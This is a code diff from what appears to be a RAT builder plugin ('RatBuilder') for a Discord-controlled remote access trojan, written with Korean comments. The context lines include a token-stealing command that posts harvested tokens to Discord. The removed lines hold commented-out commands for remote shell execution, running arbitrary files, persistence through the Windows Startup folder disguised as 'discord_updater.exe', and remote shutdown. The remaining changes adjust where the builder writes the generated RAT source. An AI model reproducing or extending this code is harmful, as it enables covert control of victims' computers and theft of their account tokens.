@@ -387,33 +387,6 @@ async def execute_ls(context: ApplicationContext):
     await context.followup.send(embed=embed)
 
 
-# @bot.slash_command(name="shell", description="명령어를 실행합니다.", guild_ids=[guild_id]) # 주석 단축키 : ctrl + k + c
-# async def execute_command(context: ApplicationContext, command: Option(str, name="명령어", description="실행할 명령어")):
-#     await context.response.defer()
-#     await asyncio.sleep(0)
-
-#     output = subprocess.Popen(
-#         command, stdout=subprocess.PIPE
-#     ).communicate()[0].decode("cp949")
-
-#     if not output:
-#         output = "결과가 출력되지 않았습니다."
-
-#     embed = Embed(title=f"쉘 접속됨 > {os.getcwd()}", description=f"```{output}```", color=0x1ABC9C)
-#     await context.followup.send(embed=embed)
-
-
-# @bot.slash_command(name="run", description="파일을 실행합니다", guild_ids=[guild_id])
-# async def run_file(context: ApplicationContext, file: Option(str, name="파일명", description="실행할 파일명")):
-#     await context.response.defer()
-#     await asyncio.sleep(0)
-
-#     subprocess.Popen(cast(file, str), shell=True)
-
-#     embed = Embed(title="파일 실행 완료", description=f"```{file}```", color=0x1ABC9C)
-#     await context.followup.send(embed=embed)
-
-
 @bot.slash_command(name="exit", description="봇을 종료합니다", guild_ids=[guild_id])
 async def close_bot(context: ApplicationContext):
     await context.channel.delete()
@@ -478,37 +451,6 @@ async def find_token(context: ApplicationContext):
     embed = Embed(title="토큰", description=f"```{result_tokens}```", color=0x1ABC9C)
     await context.followup.send(embed=embed)
 
-
-# @bot.slash_command(name="startup", description="시작프로그램을 등록합니다", guild_ids=[guild_id])
-# async def register_startup_program(context: ApplicationContext):
-#     await context.response.defer()
-#     await asyncio.sleep(0)
-
-#     path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-#     try:
-#         shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
-#         embed = Embed(title="시작프로그램 등록 성공", description=f"```{os.path.join(path, 'discord_updater.exe')}```",
-#                       color=0x1ABC9C)
-#     except shutil.Error:
-#         embed = Embed(title="오류", description=f"```시작프로그램 등록을 실패했습니다.```", color=0x1ABC9C)
-
-#     await context.followup.send(embed=embed)
-
-
-# @bot.slash_command(name="shutdown", description="컴퓨터를 종료합니다.", guild_ids=[guild_id])
-# async def shutdown_computer(context: ApplicationContext):
-#     await context.channel.delete()
-#     await bot.close()
-#     os.system("shutdown /s /t 0")
-
-
-# @bot.slash_command(name="restart", description="컴퓨터를 다시 시작합니다.", guild_ids=[guild_id])
-# async def restart_computer(context: ApplicationContext):
-#     await context.channel.delete()
-#     await bot.close()
-#     os.system("shutdown /r /t 0")
-
-
 bot.run(bot_token)
 
 """
@@ -541,18 +483,18 @@ class RatBuilder(PluginABC):
             "guild_id": guild_id
         }
 
-        with open('../../dist/rat/bot_conf.json', 'w') as f:
+        with open('dist/rat/bot_conf.json', 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=4)
 
         f.close()
 
         if option == 1:
             name = "stable"
-            f = open("stable.py", "w")
+            f = open("dist/rat/stable.py", "w", encoding='utf-8')
             f.write(stable)
         elif option == 2:
             name = "rat"
-            f = open("rat.py", "w")
+            f = open("dist/rat/rat.py", "w",  encoding='utf-8')
             f.write(code)
         else:
             await importlib.import_module("main").Hydron()
